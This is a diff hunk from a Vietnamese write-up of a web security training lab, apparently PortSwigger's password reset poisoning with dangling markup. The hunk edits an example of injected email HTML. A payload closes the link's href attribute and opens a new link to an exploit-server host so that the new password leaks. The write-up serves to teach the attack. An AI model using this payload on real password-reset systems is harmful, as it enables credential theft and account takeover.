@@ -161,7 +161,7 @@ Dựa vào cấu trúc HTML hiện tại, xây dựng chuỗi payload chèn sau 
 Khi backend ghép nối chuỗi này vào mẫu email, đoạn mã HTML kết quả sẽ có cấu trúc như sau:
 
 ```html
-<p>Please log in using your new password: <a href='https://0a5400430459246181ac7fc100d80008.web-security-academy.net:'<a href="//exploit-0a35004f0411246181257e44012400a6.exploit-server.net/?/login'>click here</a></p><p>Your new password is: [PASSWORD]</p>
+<p>Please <a href='https://0a5400430459246181ac7fc100d80008.web-security-academy.net:'<a href="//exploit-0a35004f0411246181257e44012400a6.exploit-server.net/?/login'>click here</a>....
 ```
 
 * **Cơ chế kích hoạt**: Dấu nháy đơn ngay sau dấu hai chấm sẽ đóng thuộc tính `href='` ban đầu.
